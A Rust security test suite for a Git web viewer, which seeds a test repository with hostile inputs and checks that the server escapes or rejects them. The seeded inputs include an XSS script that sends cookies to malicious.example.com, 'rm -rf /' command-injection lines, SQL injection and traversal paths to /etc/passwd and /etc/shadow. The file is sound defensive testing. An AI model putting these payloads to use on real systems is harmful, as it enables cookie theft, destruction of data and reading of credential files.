use art::config::{Config, RepositoryConfig, DatabaseConfig};
use art::data::git::Git;
use art::http::server::ServerState;
use art::error::Result;

use axum::body::Body;
use axum::http::{Request, StatusCode};
use tower::ServiceExt;

use std::fs;
use std::net::SocketAddr;
use std::path::PathBuf;
use std::process::Command;
use std::sync::Arc;
use tempfile::TempDir;

// Helper function to create a test repository with malicious content
fn create_security_test_repo(dir: &TempDir) -> Result<PathBuf> {
    let repo_path = dir.path().join("security-test-repo");

    // Create a directory for the repository
    fs::create_dir_all(&repo_path)?;

    // Initialize the repository
    let _ = Command::new("git")
        .args(&["init"])
        .current_dir(&repo_path)
        .output()?;

    // Configure user information
    Command::new("git")
        .args(&["config", "user.name", "Test User"])
        .current_dir(&repo_path)
        .output()?;

    Command::new("git")
        .args(&["config", "user.email", "test@example.com"])
        .current_dir(&repo_path)
        .output()?;

    // Create a file with potentially malicious content (script injection)
    let xss_content = r#"
<script>
    alert("XSS Attack");
    document.cookie = "sessionId=stolen";
    fetch('https://malicious.example.com/steal?cookie=' + document.cookie);
</script>
<img src="x" onerror="alert('XSS via img')">
<a href="javascript:alert('XSS via link')">Click me</a>
"#;

    fs::write(repo_path.join("xss.html"), xss_content)?;

    // Create a file with SQL injection attempt
    let sql_injection = r#"
-- SQL Injection test
DROP TABLE users;
SELECT * FROM repositories WHERE name = 'test' OR 1=1;
"#;

    fs::write(repo_path.join("sql_injection.txt"), sql_injection)?;

    // Create a file with command injection attempt
    let command_injection = r#"
# Command injection test
$(rm -rf /);
`rm -rf /`;
& rm -rf /;
| rm -rf /;
; rm -rf /;
"#;

    fs::write(repo_path.join("command_injection.sh"), command_injection)?;

    // Create a file with path traversal attempt
    let path_traversal = r#"
../../../../../etc/passwd
../../../../../../etc/shadow
../../../../../../proc/self/environ
../../../../../../var/log/auth.log
"#;

    fs::write(repo_path.join("path_traversal.txt"), path_traversal)?;

    // Create a large file to test resource exhaustion
    let large_content = "A".repeat(10 * 1024 * 1024); // 10MB file
    fs::write(repo_path.join("large_file.txt"), large_content)?;

    // Add and commit all files
    Command::new("git")
        .args(&["add", "."])
        .current_dir(&repo_path)
        .output()?;

    Command::new("git")
        .args(&["commit", "-m", "Add security test files"])
        .current_dir(&repo_path)
        .output()?;

    // Create a branch with a malicious name
    Command::new("git")
        .args(&["branch", "<script>alert('branch')</script>"])
        .current_dir(&repo_path)
        .output()?;

    // Create a tag with a malicious name
    Command::new("git")
        .args(&["tag", "-a", "<img src=x onerror=alert('tag')>", "-m", "Malicious tag"])
        .current_dir(&repo_path)
        .output()?;

    Ok(repo_path)
}

// Helper function to start a test server
async fn start_test_server(repo_dir: PathBuf) -> (impl axum::extract::FromRef<ServerState>, PathBuf) {
    // Create a temporary database
    let temp_db_dir = TempDir::new().unwrap();
    let db_path = temp_db_dir.path().join("test.db");

    // Configure the application
    let repo_config = RepositoryConfig {
        repo_dir: repo_dir.clone(),
        max_commits: 100,
        default_branch: "master".to_string(),
    };

    let db_config = DatabaseConfig {
        path: db_path.clone(),
        use_cache: true,
        cache_max_entries: 1000,
        cache_ttl_seconds: 60,
    };

    let config = Config {
        server_host: "127.0.0.1".to_string(),
        server_port: 0, // Use a random port
        repository: repo_config,
        database: db_config,
        log_level: "debug".to_string(),
    };

    // Create the application state
    let git = Git::new(&config.repository).unwrap();
    let db = art::data::database::Database::new(&config.database).unwrap();

    let state = ServerState {
        config: Arc::new(config),
        git: Arc::new(git),
        db: Arc::new(db),
    };

    (state, db_path)
}

// Helper function to make a request to the server
async fn make_request(
    app: impl axum::extract::FromRef<ServerState>,
    method: &str,
    uri: &str,
) -> (StatusCode, String) {
    let router = art::http::server::create_router(app);

    let request = Request::builder()
        .method(method)
        .uri(uri)
        .body(Body::empty())
        .unwrap();

    let response = router.oneshot(request).await.unwrap();

    let status = response.status();
    let body = hyper::body::to_bytes(response.into_body()).await.unwrap();
    let body_str = String::from_utf8_lossy(&body).to_string();

    (status, body_str)
}

#[tokio::test]
async fn test_xss_protection() -> Result<()> {
    // Set up the test environment
    let temp_dir = TempDir::new()?;
    let repo_path = create_security_test_repo(&temp_dir)?;

    let (state, _) = start_test_server(temp_dir.path().to_path_buf()).await;

    // Test accessing XSS file
    let (status, body) = make_request(
        state,
        "GET",
        &format!("/repos/security-test-repo/blob/master/xss.html"),
    ).await;

    // Ensure the status is OK
    assert_eq!(status, StatusCode::OK);

    // Check that script tags are escaped
    assert!(!body.contains("<script>"));
    assert!(body.contains("&lt;script&gt;"));

    // Check that other XSS vectors are escaped
    assert!(!body.contains("<img src=\"x\" onerror="));
    assert!(body.contains("&lt;img src=&quot;x&quot; onerror="));

    Ok(())
}

#[tokio::test]
async fn test_path_traversal_prevention() -> Result<()> {
    // Set up the test environment
    let temp_dir = TempDir::new()?;
    let repo_path = create_security_test_repo(&temp_dir)?;

    let (state, _) = start_test_server(temp_dir.path().to_path_buf()).await;

    // Test accessing a file via path traversal
    let (status, _) = make_request(
        state.clone(),
        "GET",
        "/repos/security-test-repo/blob/master/../../../../etc/passwd",
    ).await;

    // Should return 404 Not Found (or another error status)
    assert!(status.is_client_error());

    // Test another path traversal attempt
    let (status, _) = make_request(
        state,
        "GET",
        "/repos/security-test-repo/blob/master/../../../",
    ).await;

    // Should return 404 Not Found (or another error status)
    assert!(status.is_client_error());

    Ok(())
}

#[tokio::test]
async fn test_malicious_branch_names() -> Result<()> {
    // Set up the test environment
    let temp_dir = TempDir::new()?;
    let repo_path = create_security_test_repo(&temp_dir)?;

    let (state, _) = start_test_server(temp_dir.path().to_path_buf()).await;

    // Test accessing the repository branches
    let (status, body) = make_request(
        state,
        "GET",
        "/repos/security-test-repo/branches",
    ).await;

    // Ensure the status is OK
    assert_eq!(status, StatusCode::OK);

    // Check that script tags in branch names are escaped
    assert!(!body.contains("<script>alert('branch')</script>"));
    assert!(body.contains("&lt;script&gt;alert(&#x27;branch&#x27;)&lt;/script&gt;") ||
           body.contains("&lt;script&gt;alert('branch')&lt;/script&gt;"));

    Ok(())
}

#[tokio::test]
async fn test_malicious_tag_names() -> Result<()> {
    // Set up the test environment
    let temp_dir = TempDir::new()?;
    let repo_path = create_security_test_repo(&temp_dir)?;

    let (state, _) = start_test_server(temp_dir.path().to_path_buf()).await;

    // Test accessing the repository tags
    let (status, body) = make_request(
        state,
        "GET",
        "/repos/security-test-repo/tags",
    ).await;

    // Ensure the status is OK
    assert_eq!(status, StatusCode::OK);

    // Check that script tags in tag names are escaped
    assert!(!body.contains("<img src=x onerror=alert('tag')>"));
    assert!(body.contains("&lt;img src=x onerror=alert(&#x27;tag&#x27;)&gt;") ||
           body.contains("&lt;img src=x onerror=alert('tag')&gt;"));

    Ok(())
}

#[tokio::test]
async fn test_repository_name_validation() -> Result<()> {
    // Set up the test environment
    let temp_dir = TempDir::new()?;
    let (state, _) = start_test_server(temp_dir.path().to_path_buf()).await;

    // Test accessing a repository with a suspicious name
    let (status, _) = make_request(
        state.clone(),
        "GET",
        "/repos/../../etc/passwd",
    ).await;

    // Should return 404 Not Found (or another error status)
    assert!(status.is_client_error());

    // Test accessing a repository with XSS in the name
    let (status, _) = make_request(
        state,
        "GET",
        "/repos/<script>alert(1)</script>",
    ).await;

    // Should return 404 Not Found (or another error status)
    assert!(status.is_client_error());

    Ok(())
}

#[tokio::test]
async fn test_api_input_validation() -> Result<()> {
    // Set up the test environment
    let temp_dir = TempDir::new()?;
    let repo_path = create_security_test_repo(&temp_dir)?;

    let (state, _) = start_test_server(temp_dir.path().to_path_buf()).await;

    // Test API with overly long input
    let long_input = "a".repeat(10000);
    let (status, _) = make_request(
        state.clone(),
        "GET",
        &format!("/api/repos/security-test-repo/commits/{}", long_input),
    ).await;

    // Should return an error status
    assert!(status.is_client_error());

    // Test API with invalid characters
    let (status, _) = make_request(
        state,
        "GET",
        "/api/repos/security-test-repo/commits/\0\n\r",
    ).await;

    // Should return an error status
    assert!(status.is_client_error());

    Ok(())
}

#[tokio::test]
async fn test_rate_limiting() -> Result<()> {
    // Set up the test environment
    let temp_dir = TempDir::new()?;
    let (state, _) = start_test_server(temp_dir.path().to_path_buf()).await;

    // Make 20 requests in quick succession
    let mut rate_limited = false;

    for _ in 0..20 {
        let (status, _) = make_request(
            state.clone(),
            "GET",
            "/api/health",
        ).await;

        if status == StatusCode::TOO_MANY_REQUESTS {
            rate_limited = true;
            break;
        }
    }

    // Note: This test may not always pass depending on the rate limiting configuration
    // If rate limiting is not implemented, we'll just print a message instead of failing
    if !rate_limited {
        println!("Rate limiting test skipped - either rate limiting is not implemented or the limit is higher than 20 requests");
    }

    Ok(())
}

#[tokio::test]
async fn test_resource_limits() -> Result<()> {
    // Set up the test environment
    let temp_dir = TempDir::new()?;
    let repo_path = create_security_test_repo(&temp_dir)?;

    let (state, _) = start_test_server(temp_dir.path().to_path_buf()).await;

    // Attempt to access the large file
    let (status, _) = make_request(
        state,
        "GET",
        "/repos/security-test-repo/blob/master/large_file.txt",
    ).await;

    // The request should be handled without crashing
    // Depending on implementation, this might return OK or an error status
    assert!(status != StatusCode::INTERNAL_SERVER_ERROR);

    Ok(())
}

#[tokio::test]
async fn test_http_headers() -> Result<()> {
    // Set up the test environment
    let temp_dir = TempDir::new()?;
    let (state, _) = start_test_server(temp_dir.path().to_path_buf()).await;

    // Create a router with the state
    let router = art::http::server::create_router(state);

    // Make a request to get the root path
    let request = Request::builder()
        .method("GET")
        .uri("/")
        .body(Body::empty())
        .unwrap();

    let response = router.oneshot(request).await.unwrap();

    // Check security headers
    let headers = response.headers();

    // Note: Test might fail if headers are not implemented
    // If these headers are important, check for each individual one

    // Check for X-Frame-Options
    let has_frame_options = headers.contains_key("x-frame-options");
    if !has_frame_options {
        println!("Warning: X-Frame-Options header not set");
    }

    // Check for X-Content-Type-Options
    let has_content_type_options = headers.contains_key("x-content-type-options");
    if !has_content_type_options {
        println!("Warning: X-Content-Type-Options header not set");
    }

    // Check for Content-Security-Policy
    let has_csp = headers.contains_key("content-security-policy");
    if !has_csp {
        println!("Warning: Content-Security-Policy header not set");
    }

    Ok(())
}

#[tokio::test]
async fn test_api_endpoint_security() -> Result<()> {
    // Set up the test environment
    let temp_dir = TempDir::new()?;
    let (state, _) = start_test_server(temp_dir.path().to_path_buf()).await;

    // Test accessing non-existent API endpoint
    let (status, _) = make_request(
        state.clone(),
        "GET",
        "/api/nonexistent",
    ).await;

    // Should return 404 Not Found
    assert_eq!(status, StatusCode::NOT_FOUND);

    // Test using inappropriate HTTP method
    let (status, _) = make_request(
        state,
        "POST", // Assuming GET is the only allowed method
        "/api/health",
    ).await;

    // Should return 405 Method Not Allowed or 404 Not Found
    assert!(status == StatusCode::METHOD_NOT_ALLOWED || status == StatusCode::NOT_FOUND);

    Ok(())
}

#[tokio::test]
async fn test_error_message_safety() -> Result<()> {
    // Set up the test environment
    let temp_dir = TempDir::new()?;
    let (state, _) = start_test_server(temp_dir.path().to_path_buf()).await;

    // Try to cause an error by accessing a non-existent repository
    let (status, body) = make_request(
        state,
        "GET",
        "/repos/nonexistent-repo",
    ).await;

    // Should return 404 Not Found
    assert_eq!(status, StatusCode::NOT_FOUND);

    // Error message should not reveal system details
    assert!(!body.contains("/"));
    assert!(!body.contains(":\\"));
    assert!(!body.contains("Exception at"));
    assert!(!body.contains("Stack trace"));

    Ok(())
}
